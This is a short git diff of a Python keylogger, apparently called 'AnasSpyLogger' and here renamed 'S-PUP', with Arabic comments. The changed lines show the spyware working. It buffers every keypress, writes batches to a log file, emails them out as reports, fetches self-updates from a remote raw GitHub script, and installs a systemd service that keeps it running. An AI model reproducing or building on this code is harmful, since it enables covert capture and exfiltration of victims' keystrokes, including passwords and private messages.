@@ -41,7 +41,7 @@ os_info = platform.system()
 log_file = "keylogs.txt"
 buffer = []
 buffer_limit = 50
-update_url = "https://raw.githubusercontent.com/anaslabrini/AnasSpyLogger/refs/heads/main/tool/anasspylogger.py"  # رابط التحديث المباشر للسكريبت
+update_url = "https://raw.githubusercontent.com/anaslabrini/S-PUP/refs/heads/main/tool/S-PUP.py"  # رابط التحديث المباشر للسكريبت
 
 # ===== تحويل المفاتيح الخاصة إلى نصوص بشرية =====
 key_mapping = {
@@ -258,7 +258,7 @@ def on_press(key):
     if len(buffer) >= buffer_limit:
         with open(log_file, 'a') as f:
             f.write('\n'.join(buffer) + '\n')
-        send_email("AnasSpyLogger Report", '\n'.join(buffer))
+        send_email("S-PUP Report", '\n'.join(buffer))
         buffer.clear()
 
 # ===== بدء تشغيل اللوجر =====
@@ -286,7 +286,7 @@ def persist_script(output_filename):
 
 
         service_content = f"""[Unit]
-Description=AnasSpyLogger Persistence Service for {output_filename}
+Description=S-PUP Persistence Service for {output_filename}
 After=network.target
 
 [Service]
